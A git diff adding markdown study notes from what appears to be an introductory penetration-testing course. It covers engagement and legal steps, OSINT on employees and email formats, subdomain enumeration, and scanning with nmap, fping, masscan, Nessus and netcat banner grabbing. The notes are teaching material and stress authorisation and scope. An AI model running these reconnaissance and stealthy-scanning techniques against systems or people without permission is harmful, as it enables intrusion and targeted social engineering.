@@ -545,7 +545,7 @@
                 - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F-sdf6Hwvcl.png?alt=media&token=bf528751-5d26-4302-9ecd-cede17e3c75c)
             - Burp Proxy:
                 - Burp suite will let you:
-                    - Intercept requests and responses between your browser and the web server
+                    - Intercept requests and responses between your browser and the web server.
                     - Build request manually.
                     - Crawl a website by automatically visiting every page in a website.
                     - Fuzz web applications by sending them patterns of valid and invalid inputs to test their behavior.
@@ -555,3 +555,649 @@
             - Burp Repeater:
                 - Burp Repeater, which lets you manually build raw HTTP requests.
     - 140.Penetration Testing
+        - Introduction
+            - A penetration tester, much like an experienced hacker, performs a deep investigation of the remote system's security flaws. This activity requires methodology and skills.
+            - Penetration testers, unlike hackers, must test for any and all vulnerabilities, not just the ones that may grant them root access to a system. Penetration testing is not about getting root.
+            - Furthermore, Penetration Testers cannot destroy their client's infrastructure; professional pentesting requires a thorough understanding of attack vectors and their potential.
+        - Lifecycle of a Penetration Test
+            - A Penetration Test is both a complex and very delicate process.
+            - You have to thoroughly test your client's systems to find any and every vulnerability while, at the same time, you must guarantee that your activity will have the least impact possible on the production systems and services; this is crucial and is the difference between a real professional and an amateur.
+            - It is important to carefully select the right tools and techniques to use during your tests to avoid overloading your client systems and networks.
+            - Considering the penetration test as a process, rather than an unstructured block of tasks, ensures that every potential vulnerability or security weakness gets tested, with the lowest possible overhead.
+            - The success of a task depends on the success of the preceding tasks.
+            - Penetration Testing process:
+                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7Vgh-1HfzG.png?alt=media&token=3e37a544-5e79-44f0-a12b-ecc38d62cf89)
+                - All the details about the penetration test are established during the Engagement phase.
+                    - At the Quotation stage, a professional pentester defines the fee for the penetration test of a network, a web application or the whole organization.
+                    - The fee will vary according to:
+                        - Type of engagement (Black Box, Gray Box, etc.)
+                        - How time-consuming the engagement is
+                        - The complexity of the applications and services in scope
+                        - The number of targets (IP addresses, domains, etc.)
+                    - Evaluating and quoting these aspects requires experience that you will gain in the field.
+                    - If you are not able to quantify the amount of work required by an engagement, you can provide an hourly fee.
+                - Proposal Submittal:
+                    - The best way to win a job is by providing a sound and targeted proposal.
+                    - You should write the proposal keeping in mind the client's needs and infrastructure.
+                    - The proposal should include:
+                        - The understanding of the client's needs. In other words, what you understood of their requirements.
+                        - The approach and methodology you want to use, like the use of automated scanning tools, manual testing, onsite testing and any other information that fits.
+                    - Furthermore, it should also include:
+                        - How you want to address their needs and what kind of value the pentest will bring to their business. Think in terms of risks and benefits, like business continuity, improved confidentiality, avoidance of money and reputation loss due to data breaches.
+                        - A quotation in terms of price and an estimate of the time required to perform your job.
+                    - Finally, any proposal must address:
+                        - The type of engagement. Is your activity a penetration test or vulnerability assessment? Is it remote or onsite? And so on.
+                        - The scope of engagement in terms of IP addresses, network blocks, domain names or any other information useful in defining the scope.
+                - Staying in Scope:
+                    - As a professional penetration tester, you should be aware that your client might not have enough knowledge of some IT areas, especially when communicating the target to you.
+                    - You should always make sure that the target of your engagement is the property of your client. Be careful especially when asked to perform an engagement (e.g., on a single website)
+                    - If it is a part of shared hosting, you must not conduct an assessment on such a target unless you are given written permission from the hosting provider.
+                    - Always analyze the target scope and verify if it's your client's property and if you have written permission to conduct the assessment.
+                    - You should take any possible out of scope incidents very seriously; in many countries, such unauthorized activity might be considered breaking the law.
+                - Incident Handling:
+                    - An incident is an unplanned and unwanted situation that affects the client's environment and disrupt its services.
+                    - When conduction a penetration test, you should take into consideration that incidents happen.
+                    - Even when sticking to all of the best practices and performing every test very carefully, there is always a likelihood of damaging the tested assets, especially when you have little knowledge about the tested environment and cannot predict the result of every single operation.
+                    - You should always aim not to damage the target.
+                    - In case of planning some intensive or risky tests, you might want to communicate with the customer. For instance, if there are some preferred hours when possible service stoppage will be less painful to them.
+                    - It is a best practise to have an incident handling procedure.
+                    - Many large organizations already have such processes set up, while the smaller ones might not have implemented such procedures within them.
+                    - An incident handling procedure is a set of instructions that need to be executed by both you and your customer on how to proceed when an incident (e.g., service damage or unavailability) occurs.
+                    - If there is no fixed procedure established by the client, the simplest way to handle an incident is to have an emergency contact, a technical person on the client's site that is available (via phone or another form of contact) that might coordinate further incident handling for the customer's company.
+                - Legal Work:
+                    - Once the previous steps are completed, you have to deal with the legal responsibilities of each party involved; this is done by producing some legal paperwork.
+                    - Sometimes you will need to involve a lawyer as information security laws vary a lot from country to country. Other times, professional insurance is required, and it is strongly advised to have it as it only costs a few hundred dollars per year and can turn out to be very useful just in case.
+                    - Companies usually want you to sign one or more Non-Disclosure Agreements (NDAs). These documents enforce your full confidentiality regarding any information or confidential data you may come across during your engagement.
+                    - It does not matter if you have been exposed to private data, information on secret processes or products, it is your duty to keep them private and encrypted on your PC.
+                    - With an NDA, a company ensures that you will not divulge any confidential information to any third party. Confidentiality is just one of the legal aspects of pentesting. Another key point is outlining what you can and cannot do.
+                    - All of the steps seen thus far apply if you are a Freelance Penetration tester. If you work for an IT Security services company, the legal department will deal with it, and your penetration testing process will start from the next step.
+                    - Rules of engagement is another document that will define the scope of engagement and will put on paper what you are entitled to do and when; this includes the time window for your tests and your contacts in the client's organization.
+                    - You will want these contacts (client's employees or managers) to coordinate activities, or to promptly communicate with if you accidentally break something during your tests.
+                    - Once everything is clearly documented, you can move onto the practical part of the engagement, starting from information gathering.
+            - Information Gathering:
+                - Information gathering is the first and one of the most fundamental stages of a successful penetration test.
+                - Most beginners tend to overlook or rush this phase. If you want to perform an effective pentest; do not do that!
+                - Information gathering can start once the legal paperwork is complete but not before the beginning of the testing period. You don't want the client to find anything in their logs before that start date.
+                - During this stage, you are an investigator who wants to harvest information about the client's company.
+                - General Information:
+                    - Such information includes:
+                        - Board of directors
+                        - Investors
+                        - Managers and employees
+                        - Branch location and addresses
+                        - Names and email addresses of the people above.
+                    - The above information is extremely useful if Social Engineering is allowed by the rules of engagement, as you will be able to mount effective targeted attacks.
+                - Understanding the Business:
+                    - As the goal of a penetration test is to mimic the effects of a black hat hacker attack, you need to understand what are the risks involved and what are the client's critical infrastructures.
+                    - Having an understanding of the business is a key aspect in understanding what is important for your client; this allows you to know what is critical and vital for the client, thus allowing you to rate the risks associated with a successful attack.
+                - Infrastructure Information Gathering:
+                    - After collecting the General Information and you have an Understanding of the Business, the Infrastructure Information Gathering can begin.
+                    - In this phase, you transform the IP addresses or the domains in scope into actionable information about servers, operating systems and much more.
+                    - If the scope is defined as a list of IP addresses, you can move on to the next step.
+                    - If the scope is the whole company or some of their domains, you will have to harvest the relevant IP blocks by using WHOIS and other DNS information.
+                    - The goal of this phase is to give meaning to every IP address in scope by determining:
+                        - If there is alive host or server using it.
+                        - If there are one or more websites using that IP address.
+                        - What OS is running on the host or the server.
+                    - This will help you:
+                        - Focus your efforts to actual live clients and servers.
+                        - Target your attacks.
+                        - Sharpen your tools for the exploitation phase, when you have to find out the vulnerabilities and exploitability of the client systems. 
+                - Web Applications:
+                    - If there is any web application in scope, in this phase you will harvest:
+                        - Domains
+                        - Subdomains
+                        - Pages (website crawling)
+                        - Technologies in use, like PHP, Java, .NET, and so on.
+                        - Frameworks and content management systems in use, like Drupal, Joomla, Wordpress, and others.
+                    - You should treat web application as completely separate entities, that require a separate study.
+                    - You can gather information about web applications by browsing and inspecting through application proxies such as Burp.
+            - Footprinting and Scanning:
+                - During the Footprinting and Scanning phase, you deepen your knowledge of the in-scope servers and services.
+                - Fingerprinting the OS:
+                    - Fingerprinting the Operating System of a host not only gives you information about the OS running on the system, but also helps you narrow down the number of potential vulnerabilities to check in the next phases.
+                    - There are tools that can make educated guesses about the OS, the version and even the patch level of a remote system.
+                    - Those tools exploit some singularities you can find in the network stack implementation of every operating system.
+                - Port Scanning:
+                    - After having detected and fingerprinted the live hosts, it's time for port scanning
+                    - With a scan of live hosts, you can determine which ports are open on a remote system; this is crucial phase of the engagement because any mistake made here will impact the next steps.
+                    - Currently, the in reality port scanner is "nmap".
+                - Detecting Services:
+                    - Knowing that a port is open is just half of the job.
+                    - Next, you will need to know what is the service listening on that port!
+                    - In fact, knowing just the port is not enough because, a system administrator can configure a service to listen to any TCP or UDP port.
+                    - To detect which service is listening on a port, you can use nmap or other fingerprinting tools.
+                    - By knowing the services running on a machine, a penetration tester can infer:
+                        - The operating system
+                        - The purpose of a particular IP address; for example, if it is a server or a client.
+                        - The importance of the host in the client's business. For example, an e-commerce enterprise will heavily rely upon its website and its database server.
+                        - After a map of the network infrastructure and the services running on it is built, you can start the vulnerability assessment using vulnerability scan and/or manual inspection.
+            - Vulnerability Assessment:
+                - The vulnerability assessment phase is aimed at building a list of vulnerabilities present on the target systems.
+                - the penetration tester has to carry out a vulnerability assessment on each target found in the previous steps.
+                - The next phase, exploitation, will go through this list to exploit the systems.
+                - The bigger the list, the more the chances to exploit the systems in scope.
+                - You can carry out a vulnerability assessment:
+                    - Manually by using data collected in the previous phases.
+                    - By utilizing automated tools
+                - Vulnerability assessment tools are scanner that send probes to the target systems to detect whether a host has some well-known vulnerabilities.
+                - Once the vulnerability scan is complete, the scanner will deliver a report that the pentester can use in the exploitation phase.
+                - As automated scanners can perform a huge number of probes, it is extremely important to properly configure them leveraging the information collected in the previous steps.
+                - Otherwise, the scanner will blindly perform all its probes, even the ones that do not apply to your targets; this would increase the chances of crashing services and would also take more time than necessary to complete.
+                - Most of the time this phase is done by using both automated scanners and manual inspection.
+                - Automated tools can help carry out a penetration test, but they will not perform a penetration test on their own.
+            - Exploitation:
+                - At this point, it's time to verify if the vulnerabilities really exist. The exploitation phase takes care of exploitation all the vulnerabilities found during the previous step.
+                - During the exploitation phase a penetration tester checks and validates a vulnerability and also widens and increases the pentester's privileges on the target systems and networks.
+                - A successful exploit of a machine helps to investigate the target network further, to discover new targets and to repeat the process from the information phase!
+                - A penetration test is indeed a cyclic process.
+                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FKFFGllG3VN.png?alt=media&token=55b4c967-0d7a-4c95-abe6-f8b2905c0654)
+                - The process ends when there are no more systems and services in-scope to exploit.
+                - Remember, a penetration test is used to find any and all vulnerabilities.
+            - Reporting:
+                - Lastly, the final penetration test report is as important as the whole testing phase, as it is your way to officially deliver and communicate the results of your tests with:
+                    - Executives
+                    - IT Staff
+                    - Development team
+                - The report shows and explains the result of your tests and is the actual deliverable of your professional engagement.
+                - The Report:
+                    - The report must address:
+                        - Techniques used
+                        - Vulnerabilities found
+                        - Exploits used
+                        - Impact and risk analysis for each vulnerability
+                        - Remediation tips
+                    - Targeted tips on how to effectively remediate each vulnerability are the real value for the client.
+                    - Remember that the work of a penetration tester is much more appreciated if, other than his elite exploitation skills, it provides useful suggestions and techniques the client can use to resolve their security issues.
+                - Consultancy:
+                    - Penetration testers are often asked to provide some hours of consultancy after delivering the report; this is an additional service to the client should they need further clarification or help regarding your findings.
+                    - After the consultancy step, the engagement is closed and the penetration tester must keep the report encrypted in a safe place, or better yet, destroy it.
+            - The Secret of an Effective Pentest:
+                - Imagine the systems in scope as a target. The bigger the target, the more chances you have to hit it with your darts.
+                - Stages like information gathering and fingerprinting do just that; they make your target wider!
+                - In technical jargon, this activity is called "widening the attack surface".
+                - Using your time at widening the attack surface is much more valuable than shooting darts at an unknown target. You do not know where to shoot, and you do not know which technique is the best to use.
+                - On the other hand, a targeted attack has many more chances to succeed! Your main goal as a pentester is to first increase your chances of success and then shoot your darts.
+                - Sticking to the process you've just seen is the real secret for an effective pentest.
+                - In fact, highly motivated and experienced hackers spend most of their time investigating their victims and gathering information about them using as many sources as possible this helps them launch highly targeted attacks that do not trigger alarms in the victim's defense system.
+                - A successful and stealthy attack is made possible by a deep understanding of the target, which comes from a thorough information gathering phase.
+- 02.Preliminary Skills - Programming
+    - 210.Introduction to Programming
+        - What is Programming
+            - Programming basically creates a set of instructions that a computer may follow.
+            - It can be used to automate tasks, leaving specific things to be done by a machine instead of human.
+            - There are various programming and scripting languages that can be used to achieve this. They may have a different syntax and usage requirements, but their purpose is the same - to help humans by automating tasks.
+        - Low and High Level Languages
+            - Programming languages can be divided into two main groups:
+                - Low-level languages
+                - High-level languages
+            - The level can tell how close they are to the hardware.
+            - Low and high-level languages:
+                - Low level languages are interpreted directly by the computer. Their advantage is that you can do almost everything in them, while their disadvantage is their complicated nature that can lead to a vulnerability, if the developer doesn't have a deep understanding of the language's capabilities.
+                - High level languages offer ease of the development, but they are less flexible. If there are no available libraries that hold certain functionality, writing custom functionality from scratch might be a very difficult task.
+                - An example of a low-level language is assembly, which consists of instructions for the processor itself.
+                - On a side note, hackers and penetration testers use the assembly language during their (advanced) exploit development activities.
+                - Modern processors execute billions of operations per second, so writing a program using processor instructions might not seem to be worthy of any effort. There are only a few modern software types where such a language might be used, for instance, device drivers.
+                - On the other hand, high-level languages offer much more development convenience and support broader operations. Lots of single hardware operations are invisibly managed by the language engine.
+                - Java, Python, and Visual Basic are example of high-level languages.
+                - However, programs created using high-level languages cannot reside on a bare operating system and will need some software already installed on the system to run.
+                - If you are about to create code that will operate directly on computer memory, you should use a lower level language.
+                - If you are about to create a fancy graphical interface, you should use a higher level language and its graphical libraries that are available.
+        - Programming vs Scripting
+            - High level programming languages consist of:
+                - Programming languages, and
+                - Scripting languages
+            - Programming languages require a compiler.
+            - After writing code in your language of choice, you need to use a special piece of software called a compiler to convert your plain-text program file into something unreadable by a human, but readable by the language environment. You can program in Java or C++ to experience this.
+            - On the other hand, scripting languages are usually interpreted, which means that the software environment installed on your computer can read a plain-text program file the same way that you can, and it can execute the instructions without changing the file in any way.
+            - Some examples of such scripting language are Visual Basic, and partially, Python.
+        - Basic Concepts
+            - Each programming language has its own syntax. You can think of it like grammatic rules in human languages.
+            - Syntax may require some instructions to use certain characters; for example, ,,;" at the end of the each statement, while in another language this may not be needed.
+            - Variables:
+                - Programming also uses variables, which are containers that can be names and filled with data.
+                - Depending on the programming language, you may also have to choose the correct variable type. Numbers, words, or single characters are usually stored in different variable types.
+            - Functions:
+                - Programming languages allow users to create and use their own functions.
+                - In short, functions are pieces of code responsible for some repeatable tasks.
+                - Functions use arguments (as input) and might return (throws out) a value.
+            - Conditional statements:
+                - Conditional statements means that there is a condition to be checked and that there is at least on instruction defined on how to proceed further.
+            - Loops:
+                - Loops are also common on every programming language and are set of instructions that need to be executed numerous times. They are often paired with conditional statements in order to check if they should stop, or if they should repeat its instructions again.
+            - Understanding the code:
+                - When dealing with a new, unknown programming language that you do not understand, you should always start from checking all the aforementioned basic constructs in the language's manual. This will greatly help you understand what the inspected code does.
+    - 220.Programming in C++
+        - C++ IDE
+            - Download C++ IDE @[here](https://sourceforge.net/projects/orwelldevcpp/)
+        - refer original slides
+    - 230.Programming in Python
+        - refer original slides
+        - Network Sockets
+            - Network sockets are used in computer networks to exchange data (packets) between two endpoints (from a source to a destination)
+    - 240.Command Line Scripting
+- 03.Penetration Testing
+    - Information Gathering
+        - Introduction
+            - Information Gathering is the first and one of the most crucial phases of an engagement.
+            - It helps you understand the target organization, widen the attack surface and mount efficient and targeted attacks.
+        - Open-Source Intelligence
+            - Nowadays, you can collect information about a company by exploiting information available on social networks, public sites and by visiting the company websites.
+            - Social Networks Information Gathering:
+                - Many successful security breaches exploit the weakest link in the security chain: human!
+                - With the advent of social networks, hackers can now access information on people and products which were very hard to find only a few years ago.
+                - Criminals can (and actually do) now exploit this valuable information to mount sophisticated attacks.
+                - You, as a professional penetration tester can do the same, by performing queries on common soci 
+                - Given the vast array of social networks out there, the right ones for your engagement depends on the specific client and engagement.
+                - While LinkedIn, Twitter, and Facebook are good in terms of a "general purpose" shot, you have to choose between other social networks by understanding not only the target company industry but also some of the interests of its employees.
+                    - LinkedIn -- personal and work phone numbers, email addresses, different integrated accounts
+                    - Twitter
+                    - Facebook
+                    - Instagram
+            - Public Sites Information Gathering:
+                - Social networks are not the only public source of information about companies. There are also many other interesting websites and databases that "leak" valuable information.
+                - Crunch Base -- detailed information about founders, investors, employees, buyouts, and acquisitions.
+                - Government Sites -- companies that have worked with a government or are currently working with one.
+            - Whois
+                - Another precious resource is the Whois database. You can use it to get information such as:
+                    - Owner name
+                    - Street addresses
+                    - Email Address
+                    - Technical contacts
+                - regarding an Internet domain name.
+                - You can query the database by using the whois command on Linux and OSX.
+            - Browsing Client's Sites:
+                - Social networks, public sites and the whois services each give you fragmented information that you can put together to better understand your client's business.
+                - Finally, don't forget that browsing your client's actual websites will give you plenty of information about:
+                    - Products
+                    - Services
+                    - Technologies
+                    - Company culture
+            - Discovering Email Pattern:
+                - In case there is not a direct database or any other source of company emails, which often also works as logins to corporate services, you might want to try to identify them yourself.
+                - Companies tend to use one certain email schema for every employee; this makes internal communication of a company much easier.
+                - If you are able to find a company's employees (i.e., using their official website, LinkedIn, or other social networking sites), you might be able to guess their email address.
+                - Many mail systems tend to inform the sender that mail was not delivered because it does not exist.
+                - This is an excellent opportunity for a penetration tester to guess corporate email formats.
+        - Subdomain Enumeration
+            - It's common for websites of the same company to share the same top level domain name. For example, career.company.com, mail.company.com or business.company.com
+            - Through subdomain enumeration a penetration tester can possibly identify additional resources of a target.
+            - Passive subdomain enumeration - means that we will try to identify subdomains without directly interacting with the target, but through open sources.
+            - You can try this by typing the following in Google's search engine `site: company.com`
+            - Another open source that can facilitate passive subdomain enumeration is "dnsdumpster.com", that utilizes data from google-indexed subdomains, but also checks sites like Bing or virustotal for similar information.
+            - There is also a tool that extends the capabilities of DNS enumeration, called sublist3r
+                - In its basic usage, sublist3r will collect DNS data from various sources.
+            - The aforementioned subdomain enumeration techniques will help you identify publicly available target assets. Each one of them may be vulnerable to attacks, which should be thouroughly checked during the penetration test. 
+        - The Importance of Information Gathering
+            - A strong phase of Information Gathering makes the difference between a good and a bad penetration tester.
+            - A good penetration tester spends 90% of his time widening the attack surface because he knows this is what it is all about. The other 10% is just a matter of launching the correct commands with the appropriate tool with a high success rate.
+            - Your penetration test will be as strong as your weakest skill, so do not underestimate information gathering!
+    - Footprinting and Scanning
+        - Mapping a Network
+            - Ping Sweeping:
+                - Ping works by sending one or more special ICMP packets to a host. If the destination host replies with ICMP echo reply packets, then the host is alive.
+                - Ping sweeping tools automatically perform the same operation to every host in a subnet or IP range, saving you from typing hundreds or thousands ping of commands.
+                - fping is a Linux tool which is an improvides version of the standard ping utility. You can use Fping to perform ping sweeps: installed by default on Kali Linux.
+                    - `-a` option forces the tool to show only alive hosts
+                    - `-g` option tells the tool that we want to perform a ping sweep instead of a standard ping.
+                    - Command would like -- `fping -a -g 10.54.12.0/24` 
+                    - When running Fping on a LAN you are directly attached to, even if you use the -a option, you will get some warning messages (ICMP Host Unreachable) about offline hosts.
+                    - To suppress those messages, you can redirect the process standard error to `/dev/null`.
+                        - `fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null`
+                - Nmap Ping Scan:
+                    - Nmap (Network Mapper) is an open source tool for network exploration and security auditing. Installed on Kali by default.
+                    - You can perform a ping scan by using the `-sn` command line switch. You can specify your targets on the command line in CIDR format as a range and by using wildcard notation.
+                    - `# nmap –sn 200.200.0.0/16 
+# nmap –sn 200.200.123.1-12 
+# nmap –sn 172.16.12.* 
+# nmap –sn 200.200.12-13.*`
+                    - Moreover, you can save your host list in a file and use the input list `-iL` command line switch -- `nmap -sn -iL hostslist.txt`
+                    -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7RdKIul6eX.png?alt=media&token=3ba702b7-6a24-4438-a8d3-3b6d928b7497)
+            - OS Fingerprinting:
+                - Fingerprinting tools send a series of specially crafted requests to the target host.
+                - They then examine every bit in the response, creating a signature of the host behavior.
+                - Finally, the signature is compared against a database of known operating systems signatures.
+                - During a penetration test, you will have to perform this reconnaissance step on every network node, including:
+                    - Routers
+                    - Firewalls
+                    - Hosts
+                    - Servers
+                    - Printers
+                    - And so on...
+                - The goal of this phase is to write a table like the following:
+                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FLXGvnVaOkB.png?alt=media&token=a23a324c-29b2-41f0-ae1c-1b270fda631c)![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FEvLj4kICxo.png?alt=media&token=d972698e-ddab-43bc-9bf6-7094f7d1838c)
+                - To perform OS fingerprinting with nmap, you ahve to use `-O` command line option and specify your target(s).
+                - You can also add the `-Pn` switch to skip the ping scan if you already know that the targets are alive.
+            - Port Scanning:
+                - Once network mapping is performed, we know which nodes and associated operating systems, are active on the target network. 
+                - We now need a way to discover the daemons and services running on those nodes: port scanning!
+                - Port scanning is a process used to determine what TCP and UDP ports are open on target hosts. Moreover, it lets you known which daemon, in terms of software and version, is listening on a specific port.
+                - A daemon is a piece of software running on a server to provide a given service. A daemon also listen on a specific port.
+                - The ultimate goal of port scanning/service detection is to find the software name and version of the daemons running on each host.
+                - Under the Hood of a Port Scanner:
+                    - Port scanning utilities, or port scanners, automate probes request and response analysis. These are powerful tools that not only give you information about the targets but also let you detect if there is a firewall between you and the target.
+                    - TCP Connect scan:
+                        - The simplest way to perform a port scan is trying to connect to every port.
+                            - If the scanner receives a RST packet, then the port is closed.
+                            - If the scanner can complete the 3-way handshake, then the port is open. After connecting, the scanner sends an RST packet to the target host to abruptly close the connection.
+                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUQodd_SNL0.png?alt=media&token=49ea9a2e-f903-41de-b7a2-fe0ba030256a)
+                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FeVkuPkkY3F.png?alt=media&token=2fb52cc2-3dfd-42ef-ae18-aa151157f5a1)
+                        - Every TCP connect scan probe gets recorded in the daemon logs because, from the application point of view, the probe looks like a legitimate connection.
+                        - System administrators can easily detect the scan as they will see a lot of connections to all the services running on a single machine; to prevent that, TCP SYN scans were invented.
+                    - TCP SYN Scan:
+                        - TCP SYN scans were invented to be stealthy by design
+                        - During a SYN scan, the scanner does not perform a full handshake it just sends a SYN packet and analyzes the response coming from the target machine.
+                        - The scanner sends a TCP packet with the SYN flag enabled to the destination <host>:<port> pair and:
+                            - If it receives a RST packet, then it marks the port as closed.
+                            - If the scanner receives an ACK packet, then the port is open. After marking the port as open, the scanner sends an RST packet to the target host to stop the handshake.
+                        - As there is no real connection to the destination daemon, a SYN scan cannot be detected by looking at daemons logs. 
+                - Scanning with Nmap:
+                    - Nmap syntax is very simple, yet powerful:
+                    - `nmap [Scan Type(s)] [Options] {target specification}`
+                    - Nmap Scan Types:
+                        - The most used scan types are:
+                            - -sT performs a TCP connect scan
+                            - -sS performs a SYN scan
+                            - -sV performs a version detection scan
+                        - TCP connect scan with nmap -- `nmap -sT <target>`
+                        - TCP SYN scan with nmap -- `nmap -sS <target>`
+                        - Version scan with nmap -- `nmap -sV <target>`
+                            - During a version detection scan, Nmap performs a TCP connect scan and reads from the server the banner of the daemon listening on a port.
+                            - If the daemon does not send a banner by itself, Nmap sends some probes to understand what the listening application is. The idea behind this is to guess the application and its version by studying its behavior.
+                    - Specifying the Targets:
+                        - Nmap has a very flexible syntax to specify your targets. You can use DNS names, IP address lists, CIDR notation, wildcards, ranges, octets lists, and even input files.
+                        - By DNS Name:
+                            - Specifying targets by their DNS names is just a matter of writing them on the command line. `nmap <scan type> target1.domain.com target2.otherdomain.com`
+                        - With an IP addresses list:
+                            - You can write a list of IP addresses on the command line -- `nmap <scan type> 192.168.1.45 200.200.14.56`
+                        - By using CIDR Notation:
+                            - You could also use the CIDR notation if you have to scan one or more networks -- `nmap <scan type> 192.168.1.0/24 10.0.0.0/8`
+                        - By using wildcards:
+                            - Using wildcards where an asterisk * is converted to the 0-255 range -- `nmap <scan type> 192.168.1.*`
+                        - Specifying Ranges:
+                            - You can specify an interval for every octet. For example, if you want to scan just a part of a /16 network you could use: `nmap <scan type> 200.200.6-12.*`
+                    - Choosing the Ports to Scan:
+                        - When you specify one or more targets, by default, Nmap scans the most common ports used on the Internet.
+                        - If you want to specify custom ports, you can use the "-p" option.
+                        - You can specify your ports as a comma-separated list, or as a port interval.
+                        - `nmap -p 21,22 <target>`
+                        - `nmap -p 100-1000 <target>`
+                    - Discovering Network with Port Scanning:
+                        - In your penetration testing career, you might encounter networks that are protected by firewalls and where pings are blocked.
+                        - For such cases, you should be armed with at least one backup plan.
+                        - It's not uncommon to come across a server that does not respond to pings but has many TCP or UDP ports open.
+                        - When using nmap, you can use the "-Pn" switch to force the scan on such a server. (skip ping scanning and treat it as alive)
+                        - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Ff1j3NULtOS.png?alt=media&token=f3f7c5db-caac-49b0-904f-9fc71588ae22)
+                    - Spotting the firewall:
+                        - First, you pay attention to incomplete nmap results. On an open network, if a TCP scan succeeded against a well-known service, like a web server, nmap should not have any difficulty in trying to fingerprint it with -sV switch.
+                        - **tcpwrapped** means that the TCP handshake was completed, but the remote host close the connection without receiving any data.
+                        - This is an indication that something is blocking connectivity with the target host.
+                        - Moreover, you might want to use the nmap **--reason** switch that will show an explanation of why a port is marked open or closed.
+                    - Masscan:
+                        - Masscan was designed to deal with large networks and to scan thousands of IP addresses at once.
+                        - It's like nmap, but a lot faster; however, it might be a bit less accurate. It's up to you which one you will use on a penetration testing assessment.
+                        - You could perform host discovery using masscan, and then conduct a detailed scan with nmap against certain interesting hosts.
+    - Vulnerability Assessment
+        - Vulnerability assessment is a scan of the vulnerabilities found on networks and applications, it is also faster and has a lighter load on the infrastructure.
+        - We can say that the vulnerability assessment is more of a linear process as opposed to a penetration test which is more in depth, both in terms of vulnerabilities discovered and vulnerabilities tested.
+        - Vulnerability Scanners:
+            - A vulnerability assessment, in the same manner as a penetration test, can be carried out both locally and remotely.
+            - Checking one or more systems for all the known vulnerabilities would be infeasible so that penetration testers can use a vulnerability scanner.
+            - Scanners use a database of known vulnerabilities and security audits to detect the vulnerabilities of a system. scanners perform their probes on:
+                - Daemons listening on TCP and UDP ports.
+                - Configuration files of operating systems, software suites, network devices, etc.
+                - Windows registry entries.
+            - The purpose is to find vulnerabilities and mis-configurations. 
+            - The scanner's vendor keeps the tool up to date and constantly updates its database with new security checks and vulnerabilities signatures.
+            - The more the database is up to date, the better and more relevant the scan results will be.
+            - There are a lot of vulnerability scanners out there, like OpenVAS, Nexpose or GFI LAN Guard.
+            - Nessus is one of the most popular vulnerability scanners.
+        - Manual Testing:
+            - If you have to test a custom application, a vulnerability scanner may not be enough; you have to test it manually!
+            - Testing a custom application is very similar to testing a web application.
+            - Studying custom applications means:
+                - Learning and understanding its features
+                - Understanding how it exchanges data over the network
+                - Understanding how it accesses resources like databases, servers, local and remote files and so on
+                - Reverse engineering its logic
+        - Nessus
+            - Nessus is an easy to use yet powerful vulnerability scanner that works great both on a small and a large company network.
+            - It has a free license for non-commercial use.
+            - Architecture:
+                - Nessus has two components: a client and a server. You will use the client to configure the scans and the server to actually perform the scanning processes and report the results back to the client.
+                - The client component provides you with a web interface to configure your scans.
+                - The server component performs the scans by sending probes to systems and applications, collecting the responses and matching them against its vulnerability database.
+                - You can run both components on the same machine; this is a simple yet effective configuration for a home network or a lab environment.
+            - Under the Hood of a Vulnerability Scanner:
+                - Every vulnerability scanner roughly performs the same steps during a scan.
+                - Port Scanning:
+                    - The first step is determining if the target hosts are alive and which ports are open on them; to do that the vulnerability scanner performs a port scan to test the open ports on the systems. The more accurate the port scan is, the more useful results the vulnerability scanner will get.
+                - Service Detection:
+                    - For every open port found, the vulnerability scanner will send special probes to determine which application (name and version) is running on them.
+                - Vulnerabilities Database Lookup:
+                    - For each detected service (also known as a daemon), the scanner queries its database looking for known vulnerabilities.
+                    - When configuring the scanner, you can configure which vulnerabilities you want to check for.
+                - Probing:
+                    - During the last step, the scanner sends probes to verify if the vulnerability actually exists.
+                    - This phase is prone to false positives as some probes could be too mild to effectively identify a real vulnerability.
+    - Web Application Attacks
+        - Web Server Fingerprinting
+            - Fingerprinting a web server means detecting:
+                - The daemon providing the web server service, such as IIS, Apache, nginx, and others.
+                - Its version.
+                - The operating system of the machine hosting the server.
+            - Fingerprinting with Netcat:
+                - Netcat is a very popular tool that is also known as the "TCP/IP Swiss army Knife". You can use Netcat in many different ways; it can be both a server or a client.
+                - To fingerprint a web server you can use Netcat as a client to manually send requests to the server.
+                - Banner grabbing: to grab a banner you just have to connect to a listening daemon and then read the banner it sends back to your client.
+                - To connect to an HTTP server you have to pass the destination host and the destination port to Netcat. Most of the time, you will just use the default HTTP port (80). -- `nc <target address> 80`
+                - After connecting, you have to send a valid HTTP request, which you can do by using the HEAD HTTP Verb. This verb requests the header of a resource (a web page for example).
+                - Remember that every HTTP request has two empty lines between the header and the body of the request itself, so when sending body-less request like HEAD, you still have to append two empty lines. -- `nc <target> 80 \nHEAD / HTTP/1.0`
+                - After sending the two empty lines, the target server will process your request and send a response message back.
+                - Most of the time the response contains a `Server:` header containing information about the web server and, sometimes, the server operating system.
+                - Common Mistakes:
+                    - Beware of a couple of common mistakes when fingerprinting web servers with Netcat:
+                        - You have to write the request in UPPERCASE.
+                        - Netcat does not notify you after the connection to the server; you must write your request after running the command. You can change this behavior by using the verbose (-v) command line switch.
+                        - Netcat does not perform any kind of encryption, so you cannot use it to connect to an HTTPS daemon.
+            - Fingerprinting with OpenSSL:
+                - The openssl command is a command line interface to manually use various features of the OpenSSL SSL/TLS toolkit.
